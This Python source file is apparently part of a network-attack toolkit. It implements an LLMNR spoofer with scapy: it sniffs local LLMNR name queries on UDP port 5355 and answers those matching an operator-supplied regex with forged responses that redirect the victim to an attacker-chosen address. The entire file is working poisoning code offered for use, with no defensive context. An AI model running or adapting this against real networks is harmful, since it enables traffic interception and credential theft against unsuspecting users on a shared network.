from scapy.all import *
from poison import Poison
from threading import Thread
import re
import util
import config

class llmnr(Poison):
	""" Poisoner for LLMNR.  LLMNR is essentially
		DNS + NBNS introduced in Windows Vista, and supercedes
		NBNS for new versions of Windows.

		More: http://en.wikipedia.org/wiki/LLMNR
	"""
	def __init__(self):
		conf.verb = 0
		self.local = (config.get('ip_addr'),get_if_hwaddr(config.get('iface')))
		self.regex_match = None
		self.redirect = None
		super(llmnr,self).__init__("LLMNR Spoofer")

	def initialize(self):
		while True:
			try:
				util.Msg('Using interface [%s:%s]'%(config.get('iface'),self.local[1]))
				tmp = raw_input('[+] Match request regex: ')
				self.regex_match = re.compile(tmp)
				self.redirect = raw_input("[+] Redirect match requests: ")
				tmp = raw_input('[!] Match requests with \'%s\' and redirect to \'%s\'.  Is this correct?'\
								%(self.regex_match.pattern, self.redirect))

				if 'n' in tmp.lower():
					return
				break
			except KeyboardInterrupt:
				return None
			except Exception: pass

		util.Msg('Starting LLMNR spoofer...')
		sniffr = Thread(target=self.sniff_thread)
		sniffr.start()
		self.running = True
		return True

	def handler(self, pkt):
		""" Handle and parse requests """
		if pkt.haslayer(LLMNRQuery):
			request = pkt[LLMNRQuery][DNSQR].qname
			ret = self.regex_match.search(request.lower())
			if ret is None: return

			if not ret.group(0) is None and pkt[Ether].dst != self.local[0]:
				# craft our poisoned response
				r_id = pkt[LLMNRQuery].id
				response = Ether(dst=pkt[Ether].src, src=self.local[1])
				if IP in pkt:
					response /= IP(dst=pkt[IP].src)/UDP(sport=5355,dport=pkt[UDP].sport)
				elif IPv6 in pkt:
					response /= IPv6(dst=pkt[IPv6].src)/UDP(sport=5355,dport=pkt[UDP].sport)
				response /= LLMNRQuery(id=pkt[LLMNRQuery].id,qd=pkt[LLMNRQuery].qd,qr=1,qdcount=1,
								ancount=1,arcount=1,nscount=1,rcode=0,
								ns=self.gen_dnsrr(pkt), ar=self.gen_dnsrr(pkt),
								an=self.gen_dnsrr(pkt))
				sendp(response)
				self.log_msg('Spoofing \'%s\' from %s'%(request.strip(),pkt[Ether].src))	

	def gen_dnsrr(self, pkt):
		""" Generates a DNSRR for the LLMNRResponse
			packet.
		"""
		return DNSRR(rrname=pkt[LLMNRQuery].qd.name, ttl=40000, rdlen=4,
				rdata=self.redirect)

	def sniff_thread(self):
		""" LLMNR is on UDP port 5355
		"""
		sniff(filter='udp and port 5355', prn=self.handler, store=0, stopper=self.test_stop,
						stopperTimeout=3)

	def shutdown(self):
		""" Shutdown the sniffer """
		util.Msg('Shutting down LLMNR poisoner...')
		if self.running:
			self.running = False
		return True

	def session_view(self):
		""" Override session view"""
		return '%s -> %s'%(self.regex_match.pattern, self.redirect)
